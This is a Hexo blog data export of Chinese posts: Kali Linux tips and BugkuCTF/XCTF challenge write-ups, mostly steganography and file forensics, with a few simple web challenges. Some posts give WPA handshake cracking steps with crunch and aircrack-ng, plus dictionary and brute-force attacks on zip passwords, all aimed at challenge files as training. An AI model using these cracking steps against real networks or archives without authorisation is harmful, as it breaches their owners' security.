{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"kali中的文件/目录操作","slug":"kali/kali中的文件-目录操作","date":"2020-11-16T07:04:35.000Z","updated":"2020-11-16T09:00:36.831Z","comments":true,"path":"2020/11/16/kali/kali中的文件-目录操作/","link":"","permalink":"http://example.com/2020/11/16/kali/kali%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/","excerpt":"","text":"文件操作常见命令file fileName //查看文件类型等基本信息 压缩，解压缩命令tartar cvf file.tar dir //打包目录中的文件，后面也可跟多个文件 tar xvf file.tar //解包 #tar是打包，不是压缩 .gzgzip file //压缩 gunzip file.gz //解压 gzip -d file.gz //解压 .tar.gztar zcvf file.tar.gz dir //压缩 tar zxvf file.tar.gz //解压 .bz2bzip2 (-z) file //压缩，有无参数z都可 bunzip2 file.bz2 //解压 bzip2 -d file.bz2 //解压 .tar.bz2tar jcvf file.tar.bz2 dir //压缩 tar jxvf file.tar.bz2 //解压 .zipzip file.zip file/dir //压缩文件或目录 unzip file.zip //解压 .tgztar zcvf file.tar.tgz file1 file2 //压缩 tar zxvf file.tar.tgz //解压","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"http://example.com/tags/kali/"}]},{"title":"kali下root用户的配色问题","slug":"kali/kali下root用户的配色问题","date":"2020-11-15T15:46:57.000Z","updated":"2020-11-15T15:54:02.967Z","comments":true,"path":"2020/11/15/kali/kali下root用户的配色问题/","link":"","permalink":"http://example.com/2020/11/15/kali/kali%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9A%84%E9%85%8D%E8%89%B2%E9%97%AE%E9%A2%98/","excerpt":"","text":"（1）在该文件夹中粘贴颜色配置：vim /root/.bashrc vim /root/.bashrc （2）粘贴内容如下： # set variable identifying the chroot you work in (used in the prompt below) if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot) fi # set a fancy prompt (non-color, unless we know we &quot;want&quot; color) case &quot;$TERM&quot; in xterm-color) color_prompt=yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt force_color_prompt=yes if [ -n &quot;$force_color_prompt&quot; ]; then if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then # We have color support; assume it&#39;s compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fi fi if [ &quot;$color_prompt&quot; = yes ]; then PS1=&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\\[\\033[01;31m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ &#39; else PS1=&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\\u@\\h:\\w\\$ &#39; fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case &quot;$TERM&quot; in xterm*|rxvt*) PS1=&quot;\\[\\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\\u@\\h: \\w\\a\\]$PS1&quot; ;; *) ;; esac # enable color support of ls and also add handy aliases if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot; alias ls=&#39;ls --color=auto&#39; #alias dir=&#39;dir --color=auto&#39; #alias vdir=&#39;vdir --color=auto&#39; #alias grep=&#39;grep --color=auto&#39; #alias fgrep=&#39;fgrep --color=auto&#39; #alias egrep=&#39;egrep --color=auto&#39; fi # some more ls aliases #alias ll=&#39;ls -l&#39; #alias la=&#39;ls -A&#39; #alias l=&#39;ls -CF&#39; # Alias definitions. # You may want to put all your additions into a separate file like # ~/.bash_aliases, instead of adding them here directly. # See /usr/share/doc/bash-doc/examples in the bash-doc package. if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi # enable programmable completion features (you don&#39;t need to enable # this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi （3）执行命令source /root/.bashrc即可 source /root/.bashrc （4）配置前： （5）配置后：","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"http://example.com/tags/kali/"}]},{"title":"kali修改时间","slug":"kali/kali修改时间","date":"2020-11-15T15:25:20.000Z","updated":"2020-11-15T15:36:32.987Z","comments":true,"path":"2020/11/15/kali/kali修改时间/","link":"","permalink":"http://example.com/2020/11/15/kali/kali%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4/","excerpt":"","text":"（1）tzselect命令执行 tzselect （2）依次选择Asia - China - Beijing Time - Yes，只要输入选项前面的数字即可。 （3）修改配置文件，修改时区，输入以下命令 echo &quot;ZONE=Asia/Shanghai&quot; &gt;&gt; /etc/sysconfig rm -f /etc/localtime //链接到上海时区文件 ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime （4）执行完毕后重启，即可看到系统修改时间已完成","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"http://example.com/tags/kali/"}]},{"title":"Misc_006","slug":"BugkuCTF/Misc-006","date":"2020-11-15T09:10:49.000Z","updated":"2020-11-15T09:11:43.943Z","comments":true,"path":"2020/11/15/BugkuCTF/Misc-006/","link":"","permalink":"http://example.com/2020/11/15/BugkuCTF/Misc-006/","excerpt":"","text":"听首音乐（1）下载附件，是一个音频文件，用audacity工具打开（2）波形图上有些东西，Ctrl+鼠标滚轮，放大，是莫尔斯电码（3）得到….. -… -.-. —-. ..— ….. -…. ….- —-. -.-. -… —– .—- —.. —.. ..-. ….. ..— . -…. .—- –… -.. –… —– —-. ..— —-. .—- —-. .—- -.-.用在线工具解码，得到flag为5BC925649CB0188F52E617D70929191C，这里注意字母为大写，直接提交就可以。","categories":[{"name":"BugkuCTF_杂项","slug":"BugkuCTF-杂项","permalink":"http://example.com/categories/BugkuCTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_005","slug":"BugkuCTF/Misc-005","date":"2020-11-15T09:08:54.000Z","updated":"2020-11-15T09:10:07.023Z","comments":true,"path":"2020/11/15/BugkuCTF/Misc-005/","link":"","permalink":"http://example.com/2020/11/15/BugkuCTF/Misc-005/","excerpt":"","text":"乌云邀请码（1）下载附件，得到一张图片，notepad++打开，没有flag信息。再用stegsolve工具打开，发现plane0上面都有一串小黑点，选择Analyse 的Data Extract进行分析。（2）勾选红绿蓝的0层，选择BGR模式，然后点击Preview，滚动条滑到最上，看到了flag。保存命名为1.txt，打开就是flag。 神秘的文件（1）下载附件，解压后还有一个压缩包。继续解压，但需要密码，直接暴力破解，破解不出来。换一个攻击类型，改为字典攻击，导入常用密码.txt，开始攻击。（2）成功破解，密码为q1w2e3r4（3）解压成功后，得到一个docx文档，打开没有发现flag。（4）不过下面那行的红色下划线有点奇怪，应该还有字，只是字体颜色为白色，改为黑色看看。（5）提交错误，再把该docx文档放到kali下binwalk一下，发现还有其他文件，用foremost进行分离文件。（也可以使用binwalk分离文件） #apt-get install binwalk //安装binwalk #binwalk 文件名 //查看是否存在隐藏文件 #foremost -t all 文件名 //分离文件 #binwalk -e 文件名 //分离文件 （6）分解后，又是一个压缩包，解压后在docProps里发现falg.txt，里面是base64，解码后得到flag。 论剑（1）下载附件，得到一张图片（2）放到kali下binwalk一下，发现有两张图片，用foremost分解，又是两张一样的图片。（3）将得到的两张图片用stegsolve合成一下，没有发现信息。（4）再用notepad++打开三张图片，查看图片尺寸是否一样（4）发现新得到的两张图片尺寸不一样，将其修改为一样（4）查看图片，发现有两张图片携带了flag信息，但同样的部分却被遮挡住了（5）原图片中一定还有隐藏的信息，继续在notepad++中查看，发现了一串特殊的二进制字符。（5）将这串二进制字符转换成字符串（6）得到mynameiskey!!!hhh，意思是“我的名字是密码”，应该还存在加密文件（7）7z压缩包的文件头是37 7A BC AF 27 1C，与这串二进制后面的数字很像，将其改为7z压缩包的文件头，放到kali下binwalk一下（8）确实存在一个7z的压缩包，用foremost分离文件，但奇怪的是这里我分离不出来。可以直接把原图片的后缀名改为.7z，解压（9）依旧是一张图片，依旧修改图片尺寸（10）结合之前获得的flag信息，用base16解码，得到flag 图穷匕见（1）下载附件，是一张.jpg图片，binwalk一下，没发现flag信息。放到notepad++下，搜索图片结尾ff d9，在图片后面发现了一大串的特殊的数字。（2）该串数字为16进制，将其转换为ASCII码，内容为一串坐标（3）放到记事本里，在“编辑”里选择“替换”，将(,)全部替换为空（4）保存后放到kali下，这里需要使用gnuplot工具 atp-get install gnuplot //安装gnuplot工具 （5）得到一张二维码图片，扫描后得到flag convert（1）打开链接，是一大串二进制数字，编写代码，将其转换为八位一组。使用在线工具将其转换为十六进制。http://ctf.ssleye.com/jinzhi.html（2）发现十六进制的开头为52 61 72 21，显然是一个rar的压缩包。将这串十六进制数保存在一个文本文档里，用010 editor导入十六进制，另存为3.rar（3）解压后得到一张图片，查看其属性，在详细信息中发现一串base64加密的字符，解密后得到flag。","categories":[{"name":"BugkuCTF_杂项","slug":"BugkuCTF-杂项","permalink":"http://example.com/categories/BugkuCTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_004","slug":"BugkuCTF/Misc-004","date":"2020-11-15T09:07:09.000Z","updated":"2020-11-15T09:08:13.121Z","comments":true,"path":"2020/11/15/BugkuCTF/Misc-004/","link":"","permalink":"http://example.com/2020/11/15/BugkuCTF/Misc-004/","excerpt":"","text":"猫片(安恒)（1）将下载的文件后缀名改为png（注：png正常文件头：89 50 4E 47）（2）根据提示LSB和BGR，用stegsolve工具打开，发现一张png图片（2）将其保存下来，并修改后缀名为.png，但无法打开。用notepad++打开，发现文件头错误（3）将前面的ff fe删掉并保存，打开图片，是半张二维码（4）修改图片高度试试，改为和长度一样。（5）看到了完整的二维码，但和正常的有些不一样，中间的正方形应为黑色。用画图工具反色一下（新建–&gt;粘贴来源–&gt;右键–反色–&gt;裁剪）（6）扫描器扫描，得到一个网址，是一个百度云链接（7）下载下来后，是一个rar压缩包，但解压时出现了问题，可以用WinRAR打开（8）不过依然得到一个flag.txt文件（9）根据hint里的提示“NTFS”,用NtfsStreamsEditor查看数据流，然后导出。#flag.rar这个压缩文件一定要用winrar来解压才能找得到数据流。（10）一个.pyc文件，放到在线工具https://tool.lu/pyc/（11）根据这个加密脚本，再写一个解密脚本 def decode(): ciphertext = [ &#39;96&#39;, &#39;65&#39;, &#39;93&#39;, &#39;123&#39;, &#39;91&#39;, &#39;97&#39;, &#39;22&#39;, &#39;93&#39;, &#39;70&#39;, &#39;102&#39;, &#39;94&#39;, &#39;132&#39;, &#39;46&#39;, &#39;112&#39;, &#39;64&#39;, &#39;97&#39;, &#39;88&#39;, &#39;80&#39;, &#39;82&#39;, &#39;137&#39;, &#39;90&#39;, &#39;109&#39;, &#39;99&#39;, &#39;112&#39;] ciphertext.reverse() flag = &#39;&#39; for i in range(len(ciphertext)): if i % 2 == 0: s = int(ciphertext[i]) - 10 else: s = int(ciphertext[i]) + 10 s=chr(i^s) flag += s return flag def main(): flag = decode() print(flag) if __name__ == &#39;__main__&#39;: main() （12）用代码在线工具执行一下https://tool.lu/coderunner/ 多彩（1）得到一张.png的图片,在notepad++里没有发现有用信息（2）放到stegsolve里分析，发现了图片中隐藏的数据，是一个压缩包，将其抽取出来（3）先用notepad++打开这个压缩包，删掉文件头前面的东西，然后保存（4）把后缀名改为zip，解压，但出错了，后缀名改为.rar也是这样（不执行第3步也会出错）（5）看了一些大佬的writeup，压缩文件是加密的，需要用到图片中的色号。但我这里直接显示出错，没让我输入密码。后面就不会做了。（嘤嘤嘤） 1,27,59,11,23,7,57,1,1,76,222,1,1,50,214,6,77,50,53,214,6 旋转跳跃（1）附件是一个音频文件，使用工具MP3Stego来对音频进行解码。将该音频文件拷贝到MP3Stego目录下，在目录栏里输入cmd打开运行窗口。输入如下命令解码 Decode.exe -X -P syclovergeek sycgeek-mp3.mp3 //-P后面即为题目提示的密码 （2）解码完后，在MP3Stego目录下多了一个sycgeek-mp3.mp3.txt文件，打开即可看到flag。 普通的二维码（1）下载附件，得到一张二维码，扫描后没有flag。用notepad++打开看看（2）在最后发现一串数字，想到ASCII码，146作为八进制时对应的是f。然后把这串数字转换成对应的字符，得到flag。","categories":[{"name":"BugkuCTF_杂项","slug":"BugkuCTF-杂项","permalink":"http://example.com/categories/BugkuCTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Web_001","slug":"BugkuCTF/Web-001","date":"2020-11-15T09:04:52.000Z","updated":"2020-11-15T09:06:16.034Z","comments":true,"path":"2020/11/15/BugkuCTF/Web-001/","link":"","permalink":"http://example.com/2020/11/15/BugkuCTF/Web-001/","excerpt":"","text":"web2直接在URL前加“view-source:”，查看源代码，发现flag 计算器（1）打开网址，是计算两个数的和，但结果只能输入一位数字。（2）查看源代码（3）指出了字符串的最大长度为1，直接修改这个最大长度，只要改为比结果的位数大就行（4）然后计算出正确的结果就能得到flag web基础$_GET用get方法输入一个参数，参数名为“what”，值为“flag”?用来间隔URL和请求参数，若要输入多个参数，用&amp;间隔。 web基础$_POST用post方法输入一个参数，借助hackbar工具，传一个what参数，值为flag 矛盾（1）一串php代码（2）用get方法传入一个num参数，其不能为数字，但又要等于1。这里涉及php代码弱类型比较，数字和字符混合的字符串转换为整数后只保留数字部分。所以num可以构造为1xiaosong，字符部分随便。# web3（1）打开网址，一直是重复的页面（2）用view-source:查看源代码，在最下面发现一串unicode编码（3）用在线工具转为ASCII码得到flag ( http://tool.chinaz.com/tools/unicode.aspx) 域名解析（1）根据题目的意思，将域名flag.baidu.com指向到IP地址123.206.87.240windows平台在C:\\Windows\\System32\\drivers\\etc\\host中最后一行加入120.24.86.145 flag.bugku.com （这里用notepad++打开host文件，修改后保存）（2）修改完后，打开浏览器访问flag.baidu.com，得到flag#如果是linux平台，则在/etc/host中加入123.206.87.240 flag.baidu.com 你必须让他停下（1）打开网址，页面一直刷新，用burp抓包（2）发送到Repeater，点击发送，每发送一次，图片都会来一次变化，这是随机的，不断地发送，在出现10.jpg的时候发现了flag 变量1（1）打开网址，发现一段php代码（2）对代码的解释： &lt;?php error_reporting(0); //关闭php错误显示 include &quot;flag1.php&quot;; //引入flag1.php文件代码 highlight_file(__file__); if(isset($_GET[&#39;args&#39;]))&#123; //通过get方式传递 args变量才能执行if里面的代码 $args = $_GET[&#39;args&#39;]; if(!preg_match(&quot;/^\\w+$/&quot;,$args))&#123; //正则表达式的意思是匹配任意[A-Z,a-z，0-9,_]的字符，就是任意大小写字母和0-9以及下划线组成 die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$args);&quot;); &#125; ?&gt; （3）可变变量(https://www.php.net/manual/zh/language.variables.variable.php)#一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如： &lt;?php $a = &#39;hello&#39;; ?&gt; #一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。例如： &lt;?php $$a = &#39;world&#39;; ?&gt; #这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句： &lt;?php echo &quot;$a $&#123;$a&#125;&quot;; ?&gt; 与以下语句输出完全相同的结果,都会输出hello world： &lt;?php echo &quot;$a $hello&quot;; ?&gt; #要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下$$a[1] 时，解析器需要知道是想要 $a[1] 作为一个变量呢，还是想要 $$a 作为一个变量并取出该变量中索引为 [1] 的值。解决此问题的语法是，对第一种情况用 ${$a[1]}，对第二种情况用 ${$a}[1]。 #在 PHP 的函数和类的方法中，超全局变量不能用作可变变量。$this 变量也是一个特殊变量，不能被动态引用。 （4）超全局变量是在全部作用域中始终可用的内置变量这些超全局变量是： $GLOBALS $_SERVER $_GET $_POST $_FILES $_COOKIE $_SESSION $_REQUEST $_ENV （5）所以只需给变量传入一个全局变量就可以了，将其变量名传入。构造参数：?args=GLOBALS，就能得到flag。 web5（1）查看网页源代码，发现一串特殊的字符（2）根据题目的提示，JSFuck是用6个字符 [ ] ( ) ! +来编写JavaScript程序。将源代码中的特殊字符放到浏览器的console控制台上进行解密。粘贴到控制台后按回车即可。（3）注意提交格式，要求大写。CTF{WHATFK} #Jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：[ ] ( ) ! + { } 只用这些字符就能完成对任意字符串的编码。（可以在浏览器的console控制台上直接解密）","categories":[{"name":"BugkuCTF_Web","slug":"BugkuCTF-Web","permalink":"http://example.com/categories/BugkuCTF-Web/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_003","slug":"BugkuCTF/Misc-003","date":"2020-11-15T09:02:56.000Z","updated":"2020-11-15T09:04:07.360Z","comments":true,"path":"2020/11/15/BugkuCTF/Misc-003/","link":"","permalink":"http://example.com/2020/11/15/BugkuCTF/Misc-003/","excerpt":"","text":"想蹭网先解开密码（1）用wireshark打开附件（2）WiFi连接认证的重点在WPA的四次握手包，即eapol协议的包，过滤一下：（3）根据题目，需要爆破WiFi密码，使用密码生成工具crunch生成密码字典（kali自带，无需安装）这里题目提示密码为手机号，所以设置生成11位的字符，并且给出了前7位，则只剩下4位需要破解。（4）再使用软件aircrack破解WiFi密码（kali自带，无需安装），这里选择第三3个，然后开始破解，即可看到flag。#字典生成工具crunch：参数: crunch-t @/,/%/^ @插入小写字母 ，插入大写字母 %插入数字^插入特殊符号例子：（1）生成11个数字组合的密码字典： crunch 11 11 0123456789 -o mypwd.txt //第一个11代表生成的字符串最短几个字符，第二个11代表生成的字符串最长几个字符 （2）生成4个数字和1391040组合的密码字典： crunch 11 11 0123456789 -t 1391040%%%% -o mypwd.txt （3）生成4个小写字母和4个数字组合的密码字典： crunch 8 8 -t @@@@%%%% -o mypwd.txt #工具aircrack破解WiFi密码：破解WEP/WPA/WPA2加密的主流工具之一 aircrack-ng -w mypwd.txt wifi.cap //前面是密码字典的位置，后面是需要破解的握手包即.cap文件的位置，看到KEY FOUND即为找到密码 Linux2（1）用notepad++打开附件，搜索flag，无果。再试试搜key，发现flag。 细心的大象（1）得到一张.jpg的图片，用notepad++打开，发现有两张.jpg的图片，还有一些其他的文件。放到kali中用foremost分解，foremost -t all 1.jpg（2）分解完后，在output目录下发现有一个压缩包，压缩包里面还有一张2.png图片，但解压需要密码（3）查看原有图片的属性，在“详细信息”里看到备注中的一串字符（4）应该被加密了，用base64解码后得到MSDS456ASD123zz（5）以解码后的字符作为密码，解压压缩包，得到2.png（可将压缩包放到Windows下解压）（6）用notepad++打开2.png，搜索flag或key，无果。修改图片的高度，使其和长度一样（7）看到了flag 爆照(08067CTF)（1）得到一张.jpg图片，用notepad++打开（2）发现其中还包含其他文件，放到kali中用foremost分解。得到一个zip文件夹，里面有多个文件（3）用notepad++依次打开8，88，888，8888，88888，888888，8888888，88888888发现88，888，8888都是jpg文件，其他的则是bmp文件（文件头42 4D 76）。修改各个文件的后缀名（4）发现88.jpg有一个二维码，用扫描器得到bilibili（5）依次查看各图片的属性，在888.jpg中发现base64密文，解密后得到silisili（6）根据提示，按顺序分析8888.jpg，在notepad++里发现还有一个压缩包（7）将8888.jpg放到kali中用foremost分解，得到一张二维码图片，扫描后的到panama8）按顺序排列，flag为flag{bilibili_silisili_panama}，注意格式，中间记得要有下划线","categories":[{"name":"BugkuCTF_杂项","slug":"BugkuCTF-杂项","permalink":"http://example.com/categories/BugkuCTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_002","slug":"BugkuCTF/Misc-002","date":"2020-11-15T08:59:11.000Z","updated":"2020-11-15T09:01:27.632Z","comments":true,"path":"2020/11/15/BugkuCTF/Misc-002/","link":"","permalink":"http://example.com/2020/11/15/BugkuCTF/Misc-002/","excerpt":"","text":"宽带信息泄露（1）附件是一个后缀名为bin的文件，用路由器密码备份文件RouterPassView打开（2）根据提示flag为宽带用户名，在RouterPassView中用Ctrl+F搜索username，即为flag 隐写2（1）附件是一张.jpg图片，用notepad++打开（2）确认以FF D8开头后，查找结尾FF D9，发现了一个压缩包（3）该图片后缀名为zip，解压，得到提示.jpg和flag.rar，查看提示，flag.rar的解压密码为3位数4）用暴力破解工具破解密码，得到密码为871，成功解压flag.rar，得到一张图片（5）用notepad++打开图片，发现被加密的flag，用base64解码得到真正的flag内容 多种方法解决（1）附件解压后是一个exe文件，无法打开，放到notepad++里分析，发现一串base64编码的字符串（2）根据题目提示，解题过程中会得到一个二维码图片，用在线工具把base64还原为图片（3）用二维码扫描器打开，得到flag 闪的好快（1）附件是一张gif的二维码动图，用stegsolve工具打开，对其进行分解。一共18张二维码图片（2）一张张保存后，用二维码扫描工具一张张扫过去，并记录在记事本里，最终得到flag come_game（1）解压后得到一个exe文件，是个游戏，进去玩一玩（2）发现生成了3个文件，分别用notepad++打开，发现save文件是表示关卡的意思（3）将2改为3，对应的十六进制改为33，然后重新打开游戏就会跳到下一个关卡。以此类推，在第5关发现了flag，注意最后的提交格式为SYC{} 白哥的鸽子（1）得到一张jpg格式的图片，用notepad++打开，在图片结尾FF D9后面发现一串特殊的字符（2）将其十六进制数转为字符串fg2ivyo}l{2s3_o@aw__rcl@（3）得到的字符使用了栅栏密码，用CTFcrackTools解码，找到flag，最后的两个@@是干扰，去掉。 linux得到一个1.tar.gz的文件解法一（快速）：直接用7-zip打开，直到发现flag.txt文本解法二:（1）放到linux底下解压，tar -xvf 1.tar.gz（2）查看flag里可打印的字符：strings flag 或者也可以直接查看flag里的内容cat flag 隐写3（1）附件是一张图片，放到notepad++里，没有发现什么有用信息（2）再仔细查看图片，图片下面应该还有一部分，则notepad++里修改图片的高度，改为和长度一样试试（3）看到了flag","categories":[{"name":"BugkuCTF_杂项","slug":"BugkuCTF-杂项","permalink":"http://example.com/categories/BugkuCTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_001","slug":"BugkuCTF/Misc-001","date":"2020-11-15T08:54:28.000Z","updated":"2020-11-15T08:56:45.334Z","comments":true,"path":"2020/11/15/BugkuCTF/Misc-001/","link":"","permalink":"http://example.com/2020/11/15/BugkuCTF/Misc-001/","excerpt":"","text":"隐写（1）解压附件，发现有一张图片，并没有有用的信息（2）根据题意，flag被隐藏起来了，用notepad++打开（3）红色方框部分代表的是图片的像素，也可以理解为长和高，发现图片的高度比长度小了不少，将高度修改为长度的值。（4）保存后重新打开图片，发现flag 眼见非实(ISCCCTF)（1）下载附件，得到一个名为zip没有后缀名的文件（2）用notepad++打开，发现文件头是50 4B 03 04，说明是一个压缩文件（3）修改文件后缀名为.zip，解压后得到一个文档（4）双击打开后并没有发现有用信息，再用notepad++打开，发现又是一个压缩文件（5）修改后缀名为.zip，解压后得到一个文件夹（6）最终在word文件夹里找到flag，可用记事本或notepad++打开 啊哒（1）打开附件，解压后得到一张.jpg图片，用notepad++打开（2）文件头确实是以FF D8 开头，寻找结尾FF D9（3）发现FF D9后面还有一个压缩文件，50 4B 03 04，将原来的图片改后缀名为.zip，也可以在kali下用命令foremost -t all ada.jap 分离文件。（4）解压，但发现需要密码（5）查看图片属性，发现一串字符，作为密码输入，但显示密码错误（6）将这串十六进制字符转为ASCII码字符，得到sdnisc_2018，将其作为解压密码，得到flag 又一张图片，还单纯吗（1）附件是一张.jpg的图片，用notepad++打开（2）确实以FF D8开头，寻找图片结尾FF D9，接连找到几个FF D9后，又发现了一张以FF D8开头的.jpg图片（3）用kali输入命令foremost -t -all 2.jpg分离文件，则又得到了一张图片，发现flag 猜（1）附件是一张图片，根据提示是某人的名字，直接百度搜索图片，是刘亦菲，名字拼音即flag","categories":[{"name":"BugkuCTF_杂项","slug":"BugkuCTF-杂项","permalink":"http://example.com/categories/BugkuCTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_004","slug":"XCTF/Misc-004","date":"2020-11-15T08:48:52.000Z","updated":"2020-11-16T09:00:19.842Z","comments":true,"path":"2020/11/15/XCTF/Misc-004/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Misc-004/","excerpt":"","text":"embarrass（1）下载附件，是一个流量包，用wireshark打开，输入tcp contains flag，并追踪tcp流，找了很久，没有找到。（2）放到kali中，用foremost分离文件，得到大量的htm文件和一张jpg图片，但没有找到flag（3）在kaili中用strings命令找到flag strings misc_02.pcapng | grep flag MISCall（1）下载附件，得到一个没有后缀名的文件，放到kali中binwalk一下，发现是一个bzip2类型的压缩包，为了方便，重命名一下，改为1.bzip2 （2）解压 tar xvf 1.bzip2 （3）发现了一个flag.txt和.git文件夹，但flag.txt中没有flag。利用.git目录，git stash进行恢复以前修改/删除的文件。查看git 记录，给出了一个最近上传的文件，但这个文件并不存在 git log //查看git记录 （4）查看修改列表，存储列表中有一条记录 git stash list //查看修改列表 （5）校验列表中的存储文件 （6）恢复上面的文件，直接执行 git stash apply 时，会提示文件覆盖自动终止，可以先把原来的flag.txt删除再执行 git stash apply //恢复文件 （7）运行s.py得到flag python s.py Get-the-key.txt（1）下载附件，得到一个压缩包，解压后是一个没有后缀名的文件，放到kali中binwalk一下查看文件类型，也可使用file命令 file fileName （2）发现是Linux的文件系统数据，在/tmp下创建forensic文件夹，并将文件挂载到该目录下 mkdir /tmp/forensic mount -o loop forensic100 /tmp/forensic //挂载 （3）进入新创建的目录下，发现大量文件 （4）根据题目提示 get-the-key.txt，使用如下命令进行文件匹配 grep -r key.txt （5)得到一个二进制的名为1的文件，查看其类型 （6）是gzip压缩包，但用gunzip 1解压会出错，tar xvf 1也不行，最后使用gunzip &lt; 1得到flag：SECCON{@]NL7n+-s75FrET]vU=7Z} （7）还有一种方法，在得知1的类型为gzip压缩文件后，修改后缀，文件名改为1.gz，然后解压 gunzip 1.gz （8）解压成功，依然得到一个名为1的文件，再次查看该文件类型 file 1 （9）是一个ASCII码的文件，用cat查看内容，得到flag","categories":[{"name":"XCTF_Misc进阶区","slug":"XCTF-Misc进阶区","permalink":"http://example.com/categories/XCTF-Misc%E8%BF%9B%E9%98%B6%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]},{"title":"Misc_003","slug":"XCTF/Misc-003","date":"2020-11-15T08:46:23.000Z","updated":"2020-11-15T08:48:05.251Z","comments":true,"path":"2020/11/15/XCTF/Misc-003/","link":"","permalink":"http://example.com/2020/11/15/XCTF/Misc-003/","excerpt":"","text":"simple_transfer（1）下载附件，得到一个流量包，用wireshark打开，在搜索框输入tcp contains flag查找flag，并没有发现有用信息。（2）放到kali下，用foremost分解，得到一个pdf文件，打开看到flag。 Hear-with-your-Eyes（1）下载附件，一个.gz文件，解压后是一个没有后缀名的文件，用notepad++打开，没有flag信息。直接用7-zip工具打开，发现了一个sound.wav音频文件。（2）根据提示“用眼睛看这段音频”，使用audacity工具打开这个wav文件，点击“sound”切换到频谱图，就能看到flag。audacity官网下载地址：https://www.audacityteam.org/ Ditf（1）下载得到一张png图片，notepad++打开，没发现啥信息，修改下图片高度看看。（2）发现一串字符StRe1izia，应该是一个密码，将图片放到kali下用foremost分解，得到一个压缩包，解压需要密码，输入该串字符，成功解压。。（3）解压后得到一个Ditf.pcapng文件，用wireshark打开。Ctrl+F，选择字符串，搜索flag，无果。再搜索png，发现一个kiss.png。（4）追踪http流，发现一串特征明显的代码（5）用base64解码，得到flag。 神奇的Modbus（1）用wireshark打开附件，根据题意，输入modbus过滤，并追踪tcp流，可发现flag。（2）提交flag时注意题目格式为sctf{xxx}，但提交sctf{Easy_Mdbus}错误，仔细观察，根据题目，应提交sctf{Easy_Modbus}，多加一个o glance-50（1）附件是一张长条状的gif动图，很有可能就是分离gif的每一帧然后拼接形成图片得到flag。（2）将该图片放到kali里，用convert命令可以分解GIF图片 convert 9266eadf353d4ada94ededaeb96d0c50.gif flag.png （3）用convert分解出了200张图片，接下来就是图片的拼接。依旧使用kali下的工具montage。 montage flag*.png -tile x1 -geometry +0+0 flag.png //-tile是拼接时每行和每列的图片数，这里用x1，就是只一行 //-geometry是首选每个图和边框尺寸，边框为0，图照原始尺寸即可 （4）flag为TWCTF{Bliss by Charles O’Rear} What-is-this（1）得到一个.gz的压缩包，直接用7-zip工具打开，附件进行了两次压缩，最后得到两张类似的图片（2）用stegsolve工具将两张图片合成一下，得到flag 